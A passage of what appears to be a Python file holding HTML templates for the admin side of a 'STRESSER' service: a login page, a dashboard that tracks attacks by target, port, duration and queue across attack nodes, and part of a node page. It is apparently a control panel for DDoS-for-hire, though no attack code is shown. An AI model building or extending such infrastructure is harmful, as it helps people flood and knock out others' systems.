</body>
</html>
'''

ADMIN_LOGIN_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<title>Admin Login • </title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --bg: #060208;
  --surface: rgba(18, 6, 16, 0.78);
  --border: rgba(255, 40, 100, 0.2);
  --accent: #ff3366;
  --accent2: #ff6680;
  --accent3: #ff99aa;
  --text: #f0d0d8;
  --muted: rgba(220, 170, 185, 0.45);
  --radius: 28px;
}

body {
  background: var(--bg);
  font-family: 'Rajdhani', sans-serif;
  color: var(--text);
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 24px;
  overflow: hidden;
  position: relative;
}

/* Background */
.bg-grid {
  position: fixed;
  inset: 0;
  z-index: 0;
  background-image:
    linear-gradient(rgba(255,40,100,0.03) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,40,100,0.03) 1px, transparent 1px);
  background-size: 56px 56px;
  pointer-events: none;
}
.orb {
  position: fixed;
  border-radius: 50%;
  filter: blur(100px);
  opacity: 0.18;
  pointer-events: none;
  animation: drift linear infinite;
  z-index: 0;
}
.orb-1 { width: 550px; height: 550px; background: radial-gradient(#ff3366, transparent 70%); top: -200px; right: -100px; animation-duration: 20s; }
.orb-2 { width: 400px; height: 400px; background: radial-gradient(#9900ff, transparent 70%); bottom: -150px; left: -80px; animation-duration: 26s; animation-direction: reverse; }
.orb-3 { width: 250px; height: 250px; background: radial-gradient(#ff6600, transparent 70%); top: 50%; left: 40%; animation-duration: 34s; opacity: 0.1; }

@keyframes drift {
  0%   { transform: translate(0,0) scale(1); }
  33%  { transform: translate(-35px, 25px) scale(1.06); }
  66%  { transform: translate(20px,-18px) scale(0.95); }
  100% { transform: translate(0,0) scale(1); }
}

/* Scanlines */
.scanlines {
  position: fixed;
  inset: 0;
  z-index: 1;
  pointer-events: none;
  background: repeating-linear-gradient(
    0deg,
    transparent,
    transparent 3px,
    rgba(0,0,0,0.07) 3px,
    rgba(0,0,0,0.07) 4px
  );
}

/* Card */
.card {
  position: relative;
  z-index: 10;
  background: var(--surface);
  backdrop-filter: blur(22px) saturate(1.3);
  -webkit-backdrop-filter: blur(22px) saturate(1.3);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 48px 44px;
  width: 100%;
  max-width: 460px;
  box-shadow:
    0 30px 60px rgba(0,0,0,0.6),
    0 0 80px rgba(255,40,100,0.05) inset;
  animation: slideUp 0.7s cubic-bezier(0.22,1,0.36,1) both;
}
@keyframes slideUp {
  from { opacity: 0; transform: translateY(30px) scale(0.97); }
  to   { opacity: 1; transform: translateY(0) scale(1); }
}

/* Corner accents — red theme */
.card::before {
  content: '';
  position: absolute;
  top: -1px; left: -1px;
  width: 72px; height: 72px;
  border-top: 2px solid var(--accent);
  border-left: 2px solid var(--accent);
  border-radius: var(--radius) 0 0 0;
  opacity: 0.9;
}
.card::after {
  content: '';
  position: absolute;
  bottom: -1px; right: -1px;
  width: 72px; height: 72px;
  border-bottom: 2px solid var(--accent2);
  border-right: 2px solid var(--accent2);
  border-radius: 0 0 var(--radius) 0;
  opacity: 0.9;
}

/* Restricted banner */
.restricted-bar {
  display: flex;
  align-items: center;
  gap: 8px;
  background: rgba(255,40,100,0.08);
  border: 1px solid rgba(255,40,100,0.2);
  border-radius: 10px;
  padding: 8px 14px;
  margin-bottom: 28px;
  font-size: 11px;
  font-weight: 700;
  letter-spacing: 2px;
  text-transform: uppercase;
  color: var(--accent2);
}
.restricted-dot {
  width: 7px; height: 7px;
  background: var(--accent);
  border-radius: 50%;
  box-shadow: 0 0 8px var(--accent);
  animation: blink 1.4s ease-in-out infinite;
  flex-shrink: 0;
}
@keyframes blink {
  0%, 100% { opacity: 1; }
  50%       { opacity: 0.3; }
}

/* Header */
.header {
  text-align: center;
  margin-bottom: 36px;
}
.icon-wrap {
  width: 64px; height: 64px;
  background: linear-gradient(135deg, rgba(255,40,100,0.15), rgba(153,0,255,0.1));
  border: 1px solid rgba(255,40,100,0.3);
  border-radius: 18px;
  display: flex; align-items: center; justify-content: center;
  margin: 0 auto 20px;
  font-size: 28px;
  animation: adminGlow 3s ease-in-out infinite;
}
@keyframes adminGlow {
  0%, 100% { box-shadow: 0 0 20px rgba(255,40,100,0.2); }
  50%       { box-shadow: 0 0 40px rgba(255,40,100,0.45); }
}
.title {
  font-family: 'Orbitron', monospace;
  font-size: 24px;
  font-weight: 900;
  background: linear-gradient(90deg, var(--accent), var(--accent2), var(--accent3));
  background-size: 200% auto;
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  animation: shimmer 4s linear infinite;
  letter-spacing: -0.5px;
}
@keyframes shimmer {
  0% { background-position: 0% center; }
  100% { background-position: 200% center; }
}
.subtitle {
  color: var(--muted);
  font-size: 13.5px;
  margin-top: 6px;
  letter-spacing: 0.3px;
}

/* Alerts */
.alert {
  padding: 12px 16px;
  border-radius: 12px;
  font-size: 14px;
  margin-bottom: 20px;
  border: 1px solid;
  display: flex;
  align-items: center;
  gap: 10px;
  font-weight: 500;
  animation: fadeIn 0.3s ease;
}
@keyframes fadeIn { from { opacity:0; transform:translateY(-6px); } to { opacity:1; transform:translateY(0); } }
.alert-danger  { background: rgba(255,77,109,0.1);  border-color: rgba(255,77,109,0.3);  color: #ff8fa3; }
.alert-success { background: rgba(0,255,200,0.08);  border-color: rgba(0,255,200,0.25);  color: #00ffcc; }
.alert-warning { background: rgba(255,190,50,0.1);  border-color: rgba(255,190,50,0.3);  color: #ffd166; }

/* Fields */
.field {
  margin-bottom: 18px;
}
.field label {
  display: block;
  font-size: 11px;
  font-weight: 700;
  letter-spacing: 1.5px;
  text-transform: uppercase;
  color: var(--muted);
  margin-bottom: 8px;
}
.input-wrap { position: relative; }
.input-icon {
  position: absolute;
  left: 18px;
  top: 50%;
  transform: translateY(-50%);
  font-size: 16px;
  opacity: 0.5;
  pointer-events: none;
}
input[type="text"],
input[type="password"] {
  width: 100%;
  background: rgba(0,0,0,0.5);
  border: 1px solid rgba(255,255,255,0.07);
  border-radius: 14px;
  padding: 14px 18px 14px 48px;
  color: var(--text);
  font-family: 'Rajdhani', sans-serif;
  font-size: 15px;
  font-weight: 500;
  outline: none;
  transition: all 0.25s ease;
  -webkit-appearance: none;
}
input::placeholder { color: rgba(220,170,185,0.28); }
input:focus {
  border-color: var(--accent);
  box-shadow: 0 0 0 3px rgba(255,40,100,0.1), 0 0 20px rgba(255,40,100,0.07);
  background: rgba(255,40,100,0.03);
}

/* Show/hide password */
.toggle-pass {
  position: absolute;
  right: 16px;
  top: 50%;
  transform: translateY(-50%);
  background: none;
  border: none;
  color: var(--muted);
  cursor: pointer;
  font-size: 16px;
  padding: 0;
  transition: color 0.2s;
  line-height: 1;
}
.toggle-pass:hover { color: var(--accent2); }

/* Submit */
.btn-admin {
  width: 100%;
  padding: 15px;
  background: linear-gradient(135deg, var(--accent), #cc2255);
  border: none;
  border-radius: 14px;
  color: #fff;
  font-family: 'Orbitron', monospace;
  font-size: 13px;
  font-weight: 700;
  letter-spacing: 2px;
  text-transform: uppercase;
  cursor: pointer;
  transition: all 0.25s ease;
  position: relative;
  overflow: hidden;
  margin-top: 6px;
}
.btn-admin::before {
  content: '';
  position: absolute;
  inset: 0;
  background: rgba(255,255,255,0.12);
  transform: translateX(-100%) skewX(-15deg);
  transition: transform 0.4s ease;
}
.btn-admin:hover::before { transform: translateX(100%) skewX(-15deg); }
.btn-admin:hover {
  transform: translateY(-2px);
  box-shadow: 0 8px 30px rgba(255,40,100,0.4);
}
.btn-admin:active { transform: translateY(0); }

/* Warning note */
.warn-note {
  display: flex;
  align-items: center;
  gap: 8px;
  background: rgba(255,150,0,0.06);
  border: 1px solid rgba(255,150,0,0.15);
  border-radius: 10px;
  padding: 11px 14px;
  margin-top: 18px;
  font-size: 12.5px;
  color: rgba(255,200,100,0.6);
  letter-spacing: 0.2px;
}

/* Footer */
.footer {
  text-align: center;
  margin-top: 24px;
}
.footer a {
  color: rgba(220,170,185,0.5);
  text-decoration: none;
  font-size: 13px;
  font-weight: 600;
  letter-spacing: 0.3px;
  transition: color 0.2s;
  border: 1px solid rgba(255,255,255,0.06);
  border-radius: 8px;
  padding: 6px 16px;
  display: inline-block;
}
.footer a:hover { color: var(--accent2); border-color: rgba(255,40,100,0.2); background: rgba(255,40,100,0.04); }
</style>
</head>
<body>

<div class="bg-grid"></div>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>
<div class="orb orb-3"></div>
<div class="scanlines"></div>

<div class="card">

  <!-- Restricted access banner -->
  <div class="restricted-bar">
    <div class="restricted-dot"></div>
    Restricted Access — Authorized Personnel Only
  </div>

  <div class="header">
    <div class="icon-wrap">👑</div>
    <h1 class="title">Admin Portal</h1>
    <p class="subtitle">Elevated privileges required</p>
  </div>

  {% with messages = get_flashed_messages(with_categories=true) %}
    {% for cat, msg in messages %}
      <div class="alert alert-{{ cat }}">
        {% if cat == 'danger' %}⚠️{% elif cat == 'success' %}✅{% else %}ℹ️{% endif %}
        {{ msg }}
      </div>
    {% endfor %}
  {% endwith %}

  <form method="POST" autocomplete="off">

    <div class="field">
      <label>Username</label>
      <div class="input-wrap">
        <span class="input-icon">👤</span>
        <input type="text" name="username" placeholder="Admin username" required autocomplete="off">
      </div>
    </div>

    <div class="field">
      <label>Password</label>
      <div class="input-wrap">
        <span class="input-icon">🔒</span>
        <input type="password" name="password" id="passInput" placeholder="Admin password" required autocomplete="off">
        <button type="button" class="toggle-pass" onclick="togglePass()" id="toggleBtn">👁️</button>
      </div>
    </div>

    <button type="submit" class="btn-admin">🔐 &nbsp; Authenticate</button>

  </form>

  <div class="warn-note">
    ⚠️ All admin activity is logged and monitored.
  </div>

  <div class="footer">
    <a href="/login">← Back to User Login</a>
  </div>

</div>

<script>
  function togglePass() {
    const input = document.getElementById('passInput');
    const btn = document.getElementById('toggleBtn');
    input.type = input.type === 'password' ? 'text' : 'password';
    btn.textContent = input.type === 'password' ? '👁️' : '🙈';
  }
</script>

</body>
</html>
'''

ADMIN_DASHBOARD_ENHANCED_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<title>Admin Dashboard • STRESSER</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --bg: #060208;
  --surface: rgba(18, 6, 16, 0.75);
  --surface2: rgba(10, 4, 18, 0.6);
  --border: rgba(255, 40, 100, 0.18);
  --border2: rgba(255,255,255,0.06);
  --accent: #ff3366;
  --accent2: #ff6680;
  --green: #00ffaa;
  --blue: #00aaff;
  --yellow: #ffcc00;
  --orange: #ffaa00;
  --purple: #aa66ff;
  --text: #f0d0d8;
  --muted: rgba(220,170,185,0.45);
  --radius: 20px;
}

body {
  background: var(--bg);
  font-family: 'Rajdhani', sans-serif;
  color: var(--text);
  min-height: 100vh;
  padding: 28px 20px;
  position: relative;
  overflow-x: hidden;
}

/* Background */
.bg-grid {
  position: fixed; inset: 0; z-index: 0; pointer-events: none;
  background-image:
    linear-gradient(rgba(255,40,100,0.025) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,40,100,0.025) 1px, transparent 1px);
  background-size: 56px 56px;
}
.orb {
  position: fixed; border-radius: 50%; filter: blur(110px);
  opacity: 0.14; pointer-events: none; z-index: 0;
  animation: drift linear infinite;
}
.orb-1 { width: 600px; height: 600px; background: radial-gradient(#ff3366, transparent 70%); top: -200px; right: -150px; animation-duration: 22s; }
.orb-2 { width: 400px; height: 400px; background: radial-gradient(#6600ff, transparent 70%); bottom: -100px; left: -100px; animation-duration: 30s; animation-direction: reverse; }
@keyframes drift {
  0%   { transform: translate(0,0) scale(1); }
  33%  { transform: translate(-30px,20px) scale(1.05); }
  66%  { transform: translate(20px,-15px) scale(0.96); }
  100% { transform: translate(0,0) scale(1); }
}

.container { position: relative; z-index: 10; max-width: 1300px; margin: 0 auto; }

/* Topbar */
.topbar {
  display: flex; align-items: center; justify-content: space-between;
  margin-bottom: 28px; flex-wrap: wrap; gap: 12px;
  animation: fadeDown 0.5s ease both;
}
@keyframes fadeDown { from { opacity:0; transform:translateY(-16px); } to { opacity:1; transform:translateY(0); } }

.page-title {
  font-family: 'Orbitron', monospace; font-size: 22px; font-weight: 900;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
}

.admin-badge {
  display: inline-flex; align-items: center; gap: 7px;
  background: rgba(255,40,100,0.08); border: 1px solid var(--border);
  border-radius: 20px; padding: 5px 14px;
  font-size: 11px; font-weight: 700; letter-spacing: 2px;
  text-transform: uppercase; color: var(--accent2);
}
.badge-dot { width: 6px; height: 6px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); animation: blink 1.4s ease-in-out infinite; }
@keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }

/* Quick-link pills */
.quick-links {
  display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 24px;
  animation: fadeDown 0.5s ease 0.1s both;
}
.quick-link {
  display: inline-flex; align-items: center; gap: 7px;
  padding: 7px 16px; border-radius: 10px;
  font-size: 11px; font-weight: 700; letter-spacing: 1px;
  text-transform: uppercase; text-decoration: none;
  border: 1px solid var(--border2); color: var(--muted);
  transition: all 0.2s; white-space: nowrap;
}
.quick-link:hover { border-color: var(--border); color: var(--accent2); background: rgba(255,40,100,0.05); }
.quick-link i { font-size: 12px; opacity: 0.7; }

/* Section title */
.section-title {
  font-family: 'Orbitron', monospace; font-size: 12px; font-weight: 700;
  letter-spacing: 2px; text-transform: uppercase; color: var(--muted);
  margin-bottom: 14px; display: flex; align-items: center; gap: 10px;
}
.section-title::after { content:''; flex:1; height:1px; background:linear-gradient(90deg,var(--border),transparent); }

/* Attack status card */
.status-card {
  background: var(--surface);
  backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
  border: 1px solid var(--border); border-radius: var(--radius);
  padding: 20px 24px; margin-bottom: 24px;
  display: flex; align-items: center; justify-content: space-between;
  flex-wrap: wrap; gap: 16px;
  animation: fadeUp 0.6s ease 0.15s both;
}
.status-left { display: flex; align-items: center; gap: 14px; }
.status-pill {
  display: inline-flex; align-items: center; gap: 8px;
  padding: 6px 16px; border-radius: 20px;
  font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 700;
  letter-spacing: 1.5px; text-transform: uppercase;
}
.status-pill.idle    { background: rgba(0,255,170,0.1); border: 1px solid rgba(0,255,170,0.25); color: var(--green); }
.status-pill.attacking { background: rgba(255,51,102,0.15); border: 1px solid rgba(255,51,102,0.4); color: var(--accent); animation: blink 1s ease-in-out infinite; }
.status-dot { width: 7px; height: 7px; border-radius: 50%; }
.status-pill.idle .status-dot    { background: var(--green); box-shadow: 0 0 6px var(--green); }
.status-pill.attacking .status-dot { background: var(--accent); box-shadow: 0 0 12px var(--accent); }
.status-info { font-size: 14px; font-weight: 600; }

/* Stats row */
.stats-row {
  display: grid; grid-template-columns: repeat(4, 1fr); gap: 14px;
  margin-bottom: 24px;
  animation: fadeUp 0.6s ease 0.2s both;
}
.stat-card {
  background: var(--surface);
  backdrop-filter: blur(18px);
  border: 1px solid var(--border);
  border-radius: 16px; padding: 22px 18px;
  text-align: center; transition: border-color 0.2s;
}
.stat-card:hover { border-color: rgba(255,40,100,0.4); }
.stat-number {
  font-family: 'Orbitron', monospace; font-size: 38px; font-weight: 900;
  background: linear-gradient(135deg, #fff, var(--accent2));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
  line-height: 1;
}
.stat-label { font-size: 11px; color: var(--muted); margin-top: 6px; letter-spacing: 1px; text-transform: uppercase; }

/* Panel */
.panel {
  background: var(--surface);
  backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
  border: 1px solid var(--border); border-radius: var(--radius);
  overflow: hidden; margin-bottom: 24px;
}
.panel-header {
  padding: 14px 20px; background: rgba(255,40,100,0.07);
  border-bottom: 1px solid var(--border);
  font-family: 'Orbitron', monospace; font-size: 12px; font-weight: 700;
  letter-spacing: 1.5px; text-transform: uppercase; color: var(--accent2);
  display: flex; align-items: center; gap: 8px;
}
.panel-body { padding: 20px 24px; }

/* Node row */
.node-row {
  display: flex; align-items: center; padding: 12px 16px;
  border-bottom: 1px solid rgba(255,255,255,0.04);
  transition: background 0.2s; gap: 16px; flex-wrap: wrap;
  animation: fadeUp 0.4s ease both;
}
.node-row:hover { background: rgba(255,40,100,0.04); }
.node-row:last-child { border-bottom: none; }
.node-name { font-weight: 700; min-width: 140px; }
.node-type { font-size: 12px; color: var(--muted); margin-left: 4px; }
.node-status-badge {
  display: inline-flex; align-items: center; gap: 5px;
  padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; white-space: nowrap;
}
.ns-active    { background: rgba(0,255,170,0.1);  border: 1px solid rgba(0,255,170,0.25);  color: var(--green); }
.ns-nobinary  { background: rgba(255,170,0,0.1);  border: 1px solid rgba(255,170,0,0.25);  color: var(--orange); }
.ns-dead      { background: rgba(255,40,100,0.1); border: 1px solid rgba(255,40,100,0.25); color: var(--accent2); }
.ns-dot { width: 6px; height: 6px; border-radius: 50%; }
.ns-active .ns-dot   { background: var(--green); box-shadow: 0 0 5px var(--green); animation: blink 2s infinite; }
.ns-nobinary .ns-dot { background: var(--orange); }
.ns-dead .ns-dot     { background: var(--accent); }

.node-binary { font-size: 13px; white-space: nowrap; }
.node-attacks { font-family: 'Orbitron', monospace; font-size: 12px; color: var(--muted); white-space: nowrap; }
.node-actions { margin-left: auto; display: flex; gap: 6px; }

/* Buttons */
.btn {
  display: inline-flex; align-items: center; gap: 6px;
  padding: 10px 20px; border: none; border-radius: 10px;
  font-family: 'Orbitron', monospace; font-size: 10px; font-weight: 700;
  letter-spacing: 1.5px; text-transform: uppercase; cursor: pointer;
  transition: all 0.22s ease; white-space: nowrap; text-decoration: none;
}
.btn-sm { padding: 6px 14px; font-size: 10px; border-radius: 8px; }
.btn-outline {
  background: rgba(255,40,100,0.08); border: 1px solid var(--border);
  color: var(--accent2);
}
.btn-outline:hover { background: rgba(255,40,100,0.18); transform: translateY(-1px); }
.btn-success { background: rgba(0,255,170,0.12); border: 1px solid rgba(0,255,170,0.25); color: var(--green); }
.btn-success:hover { background: rgba(0,255,170,0.22); transform: translateY(-1px); }
.btn-warning { background: rgba(255,200,0,0.12); border: 1px solid rgba(255,200,0,0.25); color: var(--yellow); }
.btn-warning:hover { background: rgba(255,200,0,0.22); transform: translateY(-1px); }
.btn-danger { background: rgba(255,40,100,0.12); border: 1px solid rgba(255,40,100,0.25); color: var(--accent2); }
.btn-danger:hover { background: rgba(255,40,100,0.22); transform: translateY(-1px); }
.btn-full { width: 100%; justify-content: center; padding: 13px; font-size: 11px; }

/* Two-column actions */
.actions-row {
  display: grid; grid-template-columns: 1fr 1fr; gap: 14px;
  animation: fadeUp 0.6s ease 0.4s both;
}

/* Loading */
.loading-pulse { animation: pulse 1.5s ease-in-out infinite; }
@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
.loading-placeholder { text-align: center; padding: 30px; color: var(--muted); }

@keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }

/* Responsive */
@media (max-width: 768px) {
  .stats-row { grid-template-columns: 1fr 1fr; }
  .actions-row { grid-template-columns: 1fr; }
  .node-row { flex-direction: column; align-items: flex-start; }
  .node-actions { margin-left: 0; }
}
@media (max-width: 480px) {
  .stats-row { grid-template-columns: 1fr; }
}
</style>
</head>
<body>

<div class="bg-grid"></div>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>

<div class="container">

  <!-- Topbar -->
  <div class="topbar">
    <h1 class="page-title">Admin Dashboard</h1>
    <div class="admin-badge"><div class="badge-dot"></div> Admin Panel</div>
  </div>

  <!-- Quick Links -->
  <div class="quick-links">
    <a href="/admin/nodes" class="quick-link"><i class="fas fa-server"></i> Nodes</a>
    <a href="/admin/keys" class="quick-link"><i class="fas fa-key"></i> Keys</a>
    <a href="/admin/api_keys" class="quick-link"><i class="fas fa-key"></i> API Keys</a>
    <a href="/admin/settings" class="quick-link"><i class="fas fa-cog"></i> Settings</a>
    <a href="/admin/test-attack" class="quick-link"><i class="fas fa-flask"></i> Test Attack</a>
    {% if can_manage_admins %}
    <a href="/admin/manage" class="quick-link"><i class="fas fa-user-shield"></i> Manage Admins</a>
    {% endif %}
    <a href="/admin/logout" class="quick-link"><i class="fas fa-sign-out-alt"></i> Logout</a>
  </div>

  <!-- Attack Status -->
  <div class="section-title"><i class="fas fa-bolt"></i> Attack Status</div>
  <div class="status-card" id="attackStatusCard">
    <div class="status-left">
      <span class="status-pill idle" id="attackStatusBadge">
        <span class="status-dot"></span> Loading...
      </span>
      <span class="status-info" id="attackDetails">—</span>
    </div>
  </div>

  <!-- Stats Row -->
  <div class="stats-row">
    <div class="stat-card">
      <div class="stat-number">{{ total_users }}</div>
      <div class="stat-label">Total Users</div>
    </div>
    <div class="stat-card">
      <div class="stat-number">{{ total_attacks }}</div>
      <div class="stat-label">Total Attacks</div>
    </div>
    <div class="stat-card">
      <div class="stat-number">{{ total_nodes }}</div>
      <div class="stat-label">Total Nodes</div>
    </div>
    <div class="stat-card">
      <div class="stat-number" id="activeNodes">{{ active_nodes }}</div>
      <div class="stat-label">Active Nodes</div>
    </div>
  </div>

  <!-- Live Node Status -->
  <div class="section-title"><i class="fas fa-server"></i> Live Node Status</div>
  <div class="panel">
    <div class="panel-header">
      <i class="fas fa-network-wired"></i> Node List
      <span style="margin-left:auto;">
        <button class="btn btn-sm btn-outline" onclick="refreshNodeStatus()"><i class="fas fa-sync-alt"></i> Refresh</button>
      </span>
    </div>
    <div class="panel-body" id="nodeList">
      <div class="loading-placeholder loading-pulse"><i class="fas fa-spinner" style="margin-right:8px;"></i> Loading node status...</div>
    </div>
  </div>

  <!-- Quick Actions -->
  <div class="actions-row">
    <button class="btn btn-full btn-success" onclick="testAllNodes()"><i class="fas fa-vial"></i> Test All Nodes</button>
    <button class="btn btn-full btn-danger" onclick="stopAttack()"><i class="fas fa-stop"></i> Stop All Attacks</button>
  </div>

</div>

<script>
let refreshInterval;
let attackInterval;

document.addEventListener('DOMContentLoaded', function() {
  refreshNodeStatus();
  refreshAttackStatus();
  refreshInterval = setInterval(refreshNodeStatus, 10000);
  attackInterval = setInterval(refreshAttackStatus, 3000);
});

async function refreshNodeStatus() {
  try {
    const res = await fetch('/admin/nodes/status/all');
    const nodes = await res.json();
    renderNodeList(nodes);
    updateStats(nodes);
  } catch (e) {
    console.error(e);
  }
}

function renderNodeList(nodes) {
  const container = document.getElementById('nodeList');
  if (!nodes || nodes.length === 0) {
    container.innerHTML = '<div class="loading-placeholder">No nodes added</div>';
    return;
  }

  let html = '';
  nodes.forEach(node => {
    const statusClass = node.status === 'active' ? 'ns-active' : (node.status === 'no_binary' ? 'ns-nobinary' : 'ns-dead');
    const binaryIcon = node.binary ? '✅' : '❌';
    const enabledIcon = node.enabled ? '🟢' : '⚫';

    html += `
      <div class="node-row">
        <span>${enabledIcon}</span>
        <span class="node-name">${node.name} <span class="node-type">(${node.type})</span></span>
        <span class="node-status-badge ${statusClass}"><span class="ns-dot"></span>${node.status}</span>
        <span class="node-binary">Binary: ${binaryIcon}</span>
        <span class="node-attacks">Attacks: ${node.attack_count || 0}</span>
        <span class="node-actions">
          <button class="btn btn-sm btn-outline" onclick="testNode('${node.id}')"><i class="fas fa-sync-alt"></i></button>
        </span>
      </div>`;
  });

  container.innerHTML = html;
}

function updateStats(nodes) {
  const activeCount = nodes.filter(n => n.status === 'active').length;
  document.getElementById('activeNodes').innerText = activeCount;
}

async function testNode(nodeId) {
  const btn = event.target.closest('button');
  const origHTML = btn.innerHTML;
  btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
  btn.disabled = true;
  try {
    const res = await fetch(`/admin/nodes/${nodeId}/test`, { method: 'POST' });
    const data = await res.json();
    alert(`Test Result: ${data.status} — ${data.message}`);
    refreshNodeStatus();
  } catch (e) {
    alert('Test failed');
  } finally {
    btn.innerHTML = origHTML;
    btn.disabled = false;
  }
}

async function testAllNodes() {
  if (!confirm('Test all nodes?')) return;
  try {
    const nodes = await fetch('/admin/nodes/status/all').then(r => r.json());
    for (const node of nodes) {
      await fetch(`/admin/nodes/${node.id}/test`, { method: 'POST' });
    }
    refreshNodeStatus();
    alert('All nodes tested');
  } catch (e) {
    alert('Test all nodes failed');
  }
}

async function refreshAttackStatus() {
  try {
    const res = await fetch('/admin/attack/status');
    const data = await res.json();
    const badge = document.getElementById('attackStatusBadge');
    const details = document.getElementById('attackDetails');

    if (data.is_attacking) {
      badge.className = 'status-pill attacking';
      badge.innerHTML = '<span class="status-dot"></span> ATTACK RUNNING';
      if (data.current_attack) {
        details.innerHTML = `🎯 ${data.current_attack.target}:${data.current_attack.port} &nbsp;|&nbsp; ⏱️ ${data.current_attack.duration}s &nbsp;|&nbsp; Queue: ${data.queue_length}`;
      }
    } else {
      badge.className = 'status-pill idle';
      badge.innerHTML = '<span class="status-dot"></span> IDLE';
      details.innerHTML = `Queue: ${data.queue_length} pending`;
    }
  } catch (e) {
    // silently ignore
  }
}

async function stopAttack() {
  if (!confirm('Stop all attacks?')) return;
  try {
    await fetch('/admin/attack/stop', { method: 'POST' });
    alert('Stop command sent');
    refreshAttackStatus();
  } catch (e) {
    alert('Failed to stop attacks');
  }
}
</script>

</body>
</html>
'''

ADMIN_NODES_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<title>Node Management • Admin</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --bg: #060208;
  --surface: rgba(18, 6, 16, 0.75);
  --surface2: rgba(12, 4, 20, 0.6);
  --border: rgba(255, 40, 100, 0.18);
  --border2: rgba(255,255,255,0.06);
  --accent: #ff3366;
  --accent2: #ff6680;
  --green: #00ffaa;
  --blue: #00aaff;
  --yellow: #ffcc00;
  --text: #f0d0d8;
  --muted: rgba(220,170,185,0.45);
  --radius: 20px;
}

body {
  background: var(--bg);
  font-family: 'Rajdhani', sans-serif;
  color: var(--text);
  min-height: 100vh;
  padding: 28px 20px;
  position: relative;
  overflow-x: hidden;
}

/* Background */
.bg-grid {
  position: fixed; inset: 0; z-index: 0; pointer-events: none;
  background-image:
    linear-gradient(rgba(255,40,100,0.025) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,40,100,0.025) 1px, transparent 1px);
  background-size: 56px 56px;
}
.orb {
  position: fixed; border-radius: 50%; filter: blur(110px);
  opacity: 0.14; pointer-events: none; z-index: 0;
  animation: drift linear infinite;
}
.orb-1 { width: 600px; height: 600px; background: radial-gradient(#ff3366, transparent 70%); top: -200px; right: -150px; animation-duration: 22s; }
.orb-2 { width: 400px; height: 400px; background: radial-gradient(#6600ff, transparent 70%); bottom: -100px; left: -100px; animation-duration: 30s; animation-direction: reverse; }
@keyframes drift {
  0%   { transform: translate(0,0) scale(1); }
  33%  { transform: translate(-30px,20px) scale(1.05); }
  66%  { transform: translate(20px,-15px) scale(0.96); }
  100% { transform: translate(0,0) scale(1); }
}

.container { position: relative; z-index: 10; max-width: 1280px; margin: 0 auto; }

/* Topbar */
.topbar {
  display: flex; align-items: center; justify-content: space-between;
  margin-bottom: 32px; flex-wrap: wrap; gap: 12px;
  animation: fadeDown 0.5s ease both;
}
@keyframes fadeDown { from { opacity:0; transform:translateY(-16px); } to { opacity:1; transform:translateY(0); } }

.back-btn {
  display: inline-flex; align-items: center; gap: 8px;
  color: var(--muted); text-decoration: none; font-size: 13px;
  font-weight: 600; letter-spacing: 1px; text-transform: uppercase;
  border: 1px solid var(--border2); border-radius: 10px; padding: 8px 16px;
  transition: all 0.2s;
}
.back-btn:hover { color: var(--accent2); border-color: var(--border); background: rgba(255,40,100,0.05); }

.page-title {
  font-family: 'Orbitron', monospace;
  font-size: 22px; font-weight: 900;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
}

.admin-badge {
  display: inline-flex; align-items: center; gap: 7px;
  background: rgba(255,40,100,0.08); border: 1px solid var(--border);
  border-radius: 20px; padding: 5px 14px;
  font-size: 11px; font-weight: 700; letter-spacing: 2px;
  text-transform: uppercase; color: var(--accent2);
}
.badge-dot { width: 6px; height: 6px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); animation: blink 1.4s ease-in-out infinite; }
@keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }

/* Section headings */
.section-title {
  font-family: 'Orbitron', monospace;
  font-size: 13px; font-weight: 700; letter-spacing: 2px;
  text-transform: uppercase; color: var(--muted);
  margin-bottom: 16px; display: flex; align-items: center; gap: 10px;
}
.section-title::after { content:''; flex:1; height:1px; background:linear-gradient(90deg,var(--border),transparent); }

/* Add node grid */
